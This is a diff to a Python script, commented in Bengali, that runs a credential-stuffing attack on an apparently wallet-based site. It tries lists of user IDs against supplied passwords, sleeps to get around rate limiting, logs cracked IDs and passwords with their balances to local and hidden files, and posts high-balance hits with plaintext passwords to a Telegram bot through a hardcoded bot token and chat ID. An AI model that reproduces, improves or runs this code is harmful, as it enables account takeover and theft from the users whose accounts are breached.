@@ -1,4 +1,3 @@
-
 import os
 import json
 import time
@@ -31,15 +30,51 @@ def show_logo():
 
 def get_balance_deep(data):
     """এটি জেসন ডাটার যেকোনো লেভেল থেকে ব্যালেন্স খুঁজে বের করবে"""
-    # ১. সরাসরি চেক
-    if 'mainWallet' in data and data['mainWallet'] is not None:
-        return data['mainWallet']
-    # ২. মেম্বার অবজেক্ট চেক
-    if 'member' in data and data['member'] and 'mainWallet' in data['member']:
-        return data['member']['mainWallet']
-    # ৩. ওয়ালেট অবজেক্ট চেক
-    if 'wallet' in data and data['wallet'] and 'mainWallet' in data['wallet']:
-        return data['wallet']['mainWallet']
+    
+    def find_balance(obj):
+        """রিকার্সিভলি JSON object থেকে ব্যালেন্স খোঁজা"""
+        if isinstance(obj, dict):
+            # সরাসরি ব্যালেন্স key গুলো চেক করা
+            balance_keys = ['mainWallet', 'balance', 'totalBalance', 'walletBalance', 'amount', 'currentBalance']
+            for key in balance_keys:
+                if key in obj and obj[key] is not None:
+                    try:
+                        return float(obj[key])
+                    except:
+                        return obj[key]
+            
+            # নেস্টেড ডিকশনারিতে সার্চ
+            for k, v in obj.items():
+                result = find_balance(v)
+                if result not in (None, 0):
+                    return result
+                    
+        elif isinstance(obj, list):
+            for item in obj:
+                result = find_balance(item)
+                if result not in (None, 0):
+                    return result
+        return 0
+
+    # ১. সরাসরি ডাটাতে সার্চ
+    balance = find_balance(data)
+    if balance != 0:
+        return balance
+    
+    # ২. মেম্বার/ওয়ালেট/অ্যাকাউন্ট অবজেক্ট চেক
+    possible_objects = ['member', 'wallet', 'account', 'user', 'profile', 'info']
+    for obj_name in possible_objects:
+        if obj_name in data and data[obj_name]:
+            balance = find_balance(data[obj_name])
+            if balance != 0:
+                return balance
+    
+    # ৩. response এর মূল ডাটাতে সার্চ (পূর্বরতী অবস্থা)
+    if 'data' in data and data['data']:
+        balance = find_balance(data['data'])
+        if balance != 0:
+            return balance
+    
     return 0
 
 def attempt_login(user_id, pw):
@@ -78,7 +113,8 @@ def attempt_login(user_id, pw):
                 balance = get_balance_deep(data)
                 
                 # ভিআইপি লেভেল ফেচিং
-                level = data.get('vipInfo', {}).get('nowVipName', 'Normal')
+                vip_info = data.get('vipInfo', {})
+                level = vip_info.get('nowVipName', 'Normal')
                 uid = data.get('userId', user_id)
 
                 with lock: successful_users.add(user_id)
@@ -90,37 +126,55 @@ def attempt_login(user_id, pw):
                 status = 'Good' if is_high else 'Poor'
                 earn = '2 BDT' if is_high else '1 BDT'
 
-                # ১০০০+ ব্যালেন্স থাকলে স্পেশাল প্রোফাইল
+                # ব্যালেন্স ভিত্তিক প্রোফাইল
                 try:
-                    bal_val = float(balance)
+                    bal_val = float(balance) if isinstance(balance, (int, float, str)) else 0
                     if bal_val >= 1000:
                         send_telegram(uid, pw, balance, level)
-                        if bal_val >= 10000: earn = '100 BDT'; color = C
-                        elif bal_val >= 1500: earn = '50 BDT'; color = G
-                except: bal_val = 0
+                        if bal_val >= 10000: 
+                            earn = '100 BDT'
+                            color = C
+                        elif bal_val >= 1500: 
+                            earn = '50 BDT'
+                            color = G
+                except: 
+                    bal_val = 0
 
-                # টার্মিনালে প্রিন্ট (ব্যালেন্স ছাড়া আপনার স্টাইল)
-                print(f'{BOLD}{color} {uid} | Profile : {status} | Earned : {earn} {D}')
+                # টার্মিনালে প্রিন্ট
+                print(f'{BOLD}{color} {uid} | Profile : {status} | Earned : {earn} | Balance: {balance} {D}')
 
                 # রিয়েল টাইম ব্যালেন্স সহ ফাইলে সেভ
                 with open(filename, 'a', encoding='utf-8') as f:
                     f.write(f'{uid} | {pw} | Balance: {balance} | Rank: {level}\n')
+                    
+                # আলাদা ব্যালেন্স ফাইল
+                if bal_val > 0:
+                    with open('.balances.txt', 'a', encoding='utf-8') as f:
+                        f.write(f'{uid} | {pw} | {balance} | {level}\n')
 
-            elif res.get('status') == 'S0001': time.sleep(10)
-        elif response.status_code == 403: time.sleep(15)
-    except: pass
+            elif res.get('status') == 'S0001': 
+                time.sleep(10)
+        elif response.status_code == 403: 
+            time.sleep(15)
+    except Exception as e:
+        pass
 
 def send_telegram(uid, pw, balance, level):
     token = '7079698461:AAG1N-qrB_IWHWOW5DOFzYhdFun4kBtSEQM'
     cid = '-1003275746200'
     msg = f'🔥 [VALID HIT 1000+]\n👤 User: `{uid}`\n🔑 Pass: `{pw}`\n💰 Balance: {balance}\n🏆 Rank: {level}'
-    try: requests.post(f'https://api.telegram.org/bot{token}/sendMessage', json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'})
-    except: pass
+    try: 
+        requests.post(f'https://api.telegram.org/bot{token}/sendMessage', 
+                     json={'chat_id': cid, 'text': msg, 'parse_mode': 'Markdown'},
+                     timeout=5)
+    except: 
+        pass
 
 def main():
     show_logo()
     if not os.path.exists('.uids.txt'):
-        print(f'{R} [!] .uids.txt not found!{D}'); return
+        print(f'{R} [!] .uids.txt not found!{D}'); 
+        return
     
     p1 = input(f'{Y} PASSWORD 1 : {D}').strip()
     p2 = input(f'{Y} PASSWORD 2 : {D}').strip()
